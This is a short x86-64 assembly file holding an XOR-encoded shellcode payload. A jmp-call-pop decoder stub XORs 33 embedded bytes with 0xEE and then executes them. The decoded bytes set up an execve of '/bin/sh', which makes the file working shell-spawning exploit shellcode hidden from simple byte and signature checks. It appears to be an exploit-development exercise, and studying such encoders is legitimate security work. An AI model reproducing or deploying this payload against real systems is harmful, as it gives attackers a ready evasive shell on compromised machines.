global _start
section .text
_start:

jmp store_address 

decoder: 

	pop rdi
	xor rcx, rcx
	add cl, 33

decode:

	xor byte [rdi], 0xEE
	inc rdi
	loop decode

	jmp encoded_shellcode

store_address:

	call decoder
	encoded_shellcode: db 0xa6,0xdf,0x2e,0xbe,0xa6,0x55,0xc1,0xc1,0x8c,0x87,0x80,0xc1,0x9d,0x86,0xbd,0xa6,0x67,0x09,0xbe,0xa6,0x67,0x0c,0xbe,0xa6,0x67,0x08,0xa6,0xdf,0x2e,0x5e,0xd5,0xe1,0xeb


